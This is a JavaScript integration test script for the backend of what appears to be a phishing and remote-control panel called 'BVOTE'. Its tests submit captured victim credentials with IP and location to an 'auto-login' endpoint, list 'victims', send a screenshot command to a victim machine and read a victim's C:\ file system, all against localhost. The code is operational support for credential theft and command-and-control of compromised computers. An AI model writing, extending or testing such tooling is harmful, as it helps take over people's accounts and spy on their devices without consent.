/**
 * API Integration Test Script
 * Tests all backend API endpoints and WebSocket functionality
 */

import fetch from 'node-fetch';
import { io } from 'socket.io-client';

const API_BASE_URL = 'http://localhost:3000';
const SOCKET_URL = 'http://localhost:3000';

// Test configuration
const testConfig = {
  timeout: 10000,
  retries: 3
};

// Test results storage
let testResults = {
  passed: 0,
  failed: 0,
  total: 0,
  details: []
};

// Helper function to make API requests
async function apiRequest(endpoint, options = {}) {
  const url = `${API_BASE_URL}${endpoint}`;
  const config = {
    headers: {
      'Content-Type': 'application/json',
      ...options.headers
    },
    ...options
  };

  try {
    const response = await fetch(url, config);
    const data = await response.json();
    return { response, data, success: response.ok };
  } catch (error) {
    return { error: error.message, success: false };
  }
}

// Test runner function
async function runTest(testName, testFunction) {
  testResults.total++;
  console.log(`\n🧪 Testing: ${testName}`);
  
  try {
    const result = await testFunction();
    if (result.success) {
      testResults.passed++;
      console.log(`✅ ${testName} - PASSED`);
      testResults.details.push({ name: testName, status: 'PASSED', details: result.message });
    } else {
      testResults.failed++;
      console.log(`❌ ${testName} - FAILED: ${result.message}`);
      testResults.details.push({ name: testName, status: 'FAILED', details: result.message });
    }
  } catch (error) {
    testResults.failed++;
    console.log(`❌ ${testName} - ERROR: ${error.message}`);
    testResults.details.push({ name: testName, status: 'ERROR', details: error.message });
  }
}

// Health Check Tests
async function testHealthCheck() {
  const result = await apiRequest('/api/health');
  return {
    success: result.success && result.data.ok,
    message: result.success ? 'Health check passed' : result.error || 'Health check failed'
  };
}

async function testSystemStats() {
  const result = await apiRequest('/api/system/stats');
  return {
    success: result.success && result.data.success,
    message: result.success ? 'System stats retrieved' : result.error || 'Failed to get system stats'
  };
}

// Auto Login API Tests
async function testAutoLoginRequests() {
  const result = await apiRequest('/api/auto-login/requests');
  return {
    success: result.success && result.data.success,
    message: result.success ? `Retrieved ${result.data.total} auto login requests` : result.error || 'Failed to get auto login requests'
  };
}

async function testCreateAutoLoginRequest() {
  const requestData = {
    victimId: 'Test_Victim_001',
    website: 'https://example.com',
    username: 'test@example.com',
    password: 'testpassword123',
    ip: '192.168.1.100',
    location: 'Test Location',
    device: 'Test Device'
  };

  const result = await apiRequest('/api/auto-login/requests', {
    method: 'POST',
    body: JSON.stringify(requestData)
  });

  return {
    success: result.success && result.data.success,
    message: result.success ? `Created auto login request: ${result.data.data.id}` : result.error || 'Failed to create auto login request'
  };
}

// Victim Control API Tests
async function testVictimsList() {
  const result = await apiRequest('/api/victims');
  return {
    success: result.success && result.data.success,
    message: result.success ? `Retrieved ${result.data.total} victims` : result.error || 'Failed to get victims list'
  };
}

async function testVictimDetails() {
  const result = await apiRequest('/api/victims/Target_User_001');
  return {
    success: result.success && result.data.success,
    message: result.success ? 'Retrieved victim details' : result.error || 'Failed to get victim details'
  };
}

async function testVictimCommand() {
  const commandData = {
    command: 'screenshot',
    params: { quality: 'high' }
  };

  const result = await apiRequest('/api/victims/Target_User_001/commands', {
    method: 'POST',
    body: JSON.stringify(commandData)
  });

  return {
    success: result.success && result.data.success,
    message: result.success ? `Command sent: ${result.data.data.commandId}` : result.error || 'Failed to send victim command'
  };
}

async function testVictimFileSystem() {
  const result = await apiRequest('/api/victims/Target_User_001/filesystem?path=C:\\');
  return {
    success: result.success && result.data.success,
    message: result.success ? `Retrieved ${result.data.data.files.length} files` : result.error || 'Failed to get victim filesystem'
  };
}

// Access History API Tests
async function testAccessHistory() {
  const result = await apiRequest('/api/access-history');
  return {
    success: result.success && result.data.success,
    message: result.success ? `Retrieved ${result.data.pagination.total} access history entries` : result.error || 'Failed to get access history'
  };
}

async function testAccessHistoryStats() {
  const result = await apiRequest('/api/access-history/stats/summary');
  return {
    success: result.success && result.data.success,
    message: result.success ? `Retrieved access stats: ${result.data.data.total} total entries` : result.error || 'Failed to get access history stats'
  };
}

// System Monitoring API Tests
async function testSystemHealth() {
  const result = await apiRequest('/api/system/health');
  return {
    success: result.success && result.data.success,
    message: result.success ? `System health: ${result.data.data.status}` : result.error || 'Failed to get system health'
  };
}

async function testSystemPerformance() {
  const result = await apiRequest('/api/system/performance');
  return {
    success: result.success && result.data.success,
    message: result.success ? `Performance metrics: ${result.data.data.totalRequests} requests` : result.error || 'Failed to get system performance'
  };
}

// WebSocket Tests
async function testWebSocketConnection() {
  return new Promise((resolve) => {
    const socket = io(SOCKET_URL, {
      timeout: 5000,
      transports: ['websocket', 'polling']
    });

    let connected = false;

    socket.on('connect', () => {
      connected = true;
      socket.disconnect();
      resolve({
        success: true,
        message: 'WebSocket connection successful'
      });
    });

    socket.on('connect_error', (error) => {
      if (!connected) {
        resolve({
          success: false,
          message: `WebSocket connection failed: ${error.message}`
        });
      }
    });

    setTimeout(() => {
      if (!connected) {
        socket.disconnect();
        resolve({
          success: false,
          message: 'WebSocket connection timeout'
        });
      }
    }, 5000);
  });
}

async function testWebSocketAuthentication() {
  return new Promise((resolve) => {
    const socket = io(SOCKET_URL);
    let authenticated = false;

    socket.on('connect', () => {
      // Send mock authentication
      socket.emit('authenticate', {
        token: 'mock_token_for_testing',
        clientType: 'admin'
      });
    });

    socket.on('auth:success', (data) => {
      authenticated = true;
      socket.disconnect();
      resolve({
        success: true,
        message: 'WebSocket authentication successful'
      });
    });

    socket.on('auth:error', (error) => {
      socket.disconnect();
      resolve({
        success: false,
        message: `WebSocket authentication failed: ${error.error}`
      });
    });

    setTimeout(() => {
      if (!authenticated) {
        socket.disconnect();
        resolve({
          success: false,
          message: 'WebSocket authentication timeout'
        });
      }
    }, 5000);
  });
}

// Main test execution
async function runAllTests() {
  console.log('🚀 Starting BVOTE Backend API Integration Tests\n');
  console.log(`Testing against: ${API_BASE_URL}`);
  console.log(`WebSocket URL: ${SOCKET_URL}\n`);

  // Health & System Tests
  await runTest('Health Check', testHealthCheck);
  await runTest('System Stats', testSystemStats);
  await runTest('System Health', testSystemHealth);
  await runTest('System Performance', testSystemPerformance);

  // Auto Login API Tests
  await runTest('Auto Login Requests List', testAutoLoginRequests);
  await runTest('Create Auto Login Request', testCreateAutoLoginRequest);

  // Victim Control API Tests
  await runTest('Victims List', testVictimsList);
  await runTest('Victim Details', testVictimDetails);
  await runTest('Victim Command', testVictimCommand);
  await runTest('Victim File System', testVictimFileSystem);

  // Access History API Tests
  await runTest('Access History List', testAccessHistory);
  await runTest('Access History Stats', testAccessHistoryStats);

  // WebSocket Tests
  await runTest('WebSocket Connection', testWebSocketConnection);
  await runTest('WebSocket Authentication', testWebSocketAuthentication);

  // Print final results
  console.log('\n' + '='.repeat(60));
  console.log('📊 TEST RESULTS SUMMARY');
  console.log('='.repeat(60));
  console.log(`Total Tests: ${testResults.total}`);
  console.log(`✅ Passed: ${testResults.passed}`);
  console.log(`❌ Failed: ${testResults.failed}`);
  console.log(`Success Rate: ${((testResults.passed / testResults.total) * 100).toFixed(1)}%`);

  if (testResults.failed > 0) {
    console.log('\n❌ FAILED TESTS:');
    testResults.details
      .filter(test => test.status !== 'PASSED')
      .forEach(test => {
        console.log(`  - ${test.name}: ${test.details}`);
      });
  }

  console.log('\n' + '='.repeat(60));
  
  // Exit with appropriate code
  process.exit(testResults.failed > 0 ? 1 : 0);
}

// Run tests if this file is executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
  runAllTests().catch(error => {
    console.error('Test execution failed:', error);
    process.exit(1);
  });
}

export { runAllTests, testResults };
